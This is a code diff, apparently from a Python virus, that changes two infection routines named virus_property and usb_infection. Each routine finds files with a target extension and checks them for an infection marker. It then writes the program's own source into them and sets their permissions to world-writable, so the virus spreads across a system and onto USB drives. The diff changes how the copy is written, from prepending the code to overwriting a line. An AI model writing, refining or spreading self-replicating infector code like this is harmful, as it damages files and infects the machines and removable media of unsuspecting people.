@@ -37,12 +37,13 @@ def virus_property():
             if file.endswith(target):
                 try:
                     with open(file, 'rb+') as g:
-                        line = g.read()
-                        if status not in line:
+                        line = g.readlines()
+                        if status not in line[8]:
                             g.seek(0, 0)
                             with open(sys.argv[0], 'rb+') as c:
                                 lines = c.read()
-                                g.write(lines + '\n' + line)
+                                line[1] = lines
+                                g.writelines(line)
                                 g.close()
                                 c.close()
                                 os.chmod(file, 0o777)
@@ -65,12 +66,13 @@ def usb_infection():
                 if file.endswith(target):
                     try:
                         with open(file, 'rb+') as g:
-                            line = g.read()
-                            if status not in line:
+                            line = g.readlines()
+                            if status not in line[8]:
                                 g.seek(0, 0)
                                 with open(sys.argv[0], 'rb+') as c:
                                     lines = c.read()
-                                    g.write(lines + '\n' + line)
+                                    line[1] = lines
+                                    g.writelines(line)
                                     g.close()
                                     c.close()
                                     os.chmod(file, 0o777)
